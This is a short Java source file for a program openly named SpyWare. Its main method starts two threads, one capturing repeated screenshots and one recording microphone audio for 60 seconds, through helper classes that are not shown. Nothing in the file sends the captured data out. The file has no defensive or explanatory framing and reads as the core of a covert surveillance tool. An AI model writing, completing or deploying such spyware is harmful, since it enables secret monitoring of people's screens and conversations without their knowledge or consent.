package spy;

public class SpyWare {

    private static final long RECORD_TIME = 60000;

    public static void main(String[] args) {
        screenshotThread();
        recorderThread();
    }

    public static void recorderThread() {
        AudioRecorder audioRecorder = new AudioRecorder();
        Runnable runnable = () -> audioRecorder.stopRecordingAudio(RECORD_TIME);
        Thread stopper = new Thread(runnable);
        stopper.start();
        audioRecorder.startRecording();
    }

    public static void screenshotThread() {
        Runnable runnable = Screenshot::multipleScreenShots;
        Thread screenShotThread = new Thread(runnable);
        screenShotThread.start();
    }
}
